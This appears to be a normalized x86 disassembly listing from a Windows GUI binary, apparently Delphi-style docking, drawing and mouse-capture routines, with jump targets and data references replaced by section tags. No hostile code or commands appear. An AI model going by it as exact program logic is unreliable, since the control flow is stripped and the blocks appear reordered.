lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452dc6
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_452dcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_452e7b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4513d8
mov eax [ ebp - 0x8 ]
call sub_452d54
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_452dcc
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452e82
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_452dcc
pop ecx
sub_452e88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_452fc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_452f70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44dd78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452f77
mov eax [ ebp - 0x10 ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_452d54
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44dd8c
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_452f77
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_452dcc
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452fc8
lea eax [ ebp - 0x14 ]
call sub_404008
retn
sub_452fd0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451720
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451748
call sub_452fd0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451720
call sub_452fd0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_451150
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_451648
mov edx eax
mov eax ebx
call sub_451670
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_451670
jmp r-xdata
sub_453058
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_452fd0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_45309c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_451648
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_451670
sub_4530cc
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_44f2dc
mov edx eax
mov eax [ rw-data ]
call sub_453c2c
mov eax [ ebx + 0x14 ]
call sub_44f2dc
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_4531e0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_45312c
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_453c2c
mov eax ebx
call sub_4531e0
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_451670
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_451670
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_453058
push ebx
push sub_4531d0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4519fc
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4531a8
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44dd78
test eax eax
jle r-xdata
push ebx
push sub_4531d0
xor edx edx
mov eax ebx
call sub_4519fc
sub_4531e0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_451214
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_451214
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_451280
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_451280
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_423fe8
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push r--data
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_4532cc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4532cc
pop ecx
mov eax ebx
call sub_451648
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_451648
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4532cc
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_451648
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4292a0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_45335c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451648
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4511cc
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_451648
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_4532cc
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4533ac
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_448494
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_448494
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_453428
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4510d8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_451184
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_45172c
test eax eax
je r-xdata
mov eax esi
call sub_451150
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4531d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4519fc
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_45172c
mov edx [ ebx + 0x20 ]
call sub_451684
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_453428
pop ecx
sub_4534a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_451134
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_451134
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_45172c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4534a8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4531d0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4519fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_451330
mov eax edi
call sub_451720
test eax eax
je r-xdata
mov eax edi
call sub_45172c
mov esi eax
mov eax esi
call sub_451648
push eax
mov eax esi
call sub_451184
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_451720
call sub_451648
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_451648
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_451670
mov eax esi
call sub_451648
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_451670
mov eax edi
call sub_45172c
call sub_4516c0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_451184
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_451670
mov eax edi
call sub_451720
call sub_4516c0
mov bl 0x1
jmp r-xdata
sub_4535e0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_451994
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_416cac
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_452188
test eax eax
je r-xdata
push ebp
call sub_453428
pop ecx
push ebp
call sub_4534a8
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4533ac
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_453668
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_451214
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_451214
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45335c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_45335c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_4536f8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453ad0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b4c
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_452188
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45312c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b4c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_452188
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448638
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453ad7
lea eax [ ebp - 0x48 ]
call sub_404008
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f2dc
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_447354
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4497f4
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404008
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4535e0
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44de0c
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_4531e0
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406b4c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_453668
pop ecx
mov eax [ ebp - 0x4 ]
call sub_4531e0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406b4c
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_452188
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_448a14
jmp r-xdata
mov eax edi
call sub_464e7c
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_452188
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_448494
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_448af4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40405c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4530cc
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46657c
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_44f2dc
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_44919c
jmp r-xdata
sub_453ae0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403260
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_453c54
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_453b70
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_453c2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_453bd4
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_453c04
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406c40
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_453c2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453ba0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_453c54
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_453bb8
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_453bd4
pop ebx
retn
mov eax ebx
call sub_453c04
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_453cb8
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453e1e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
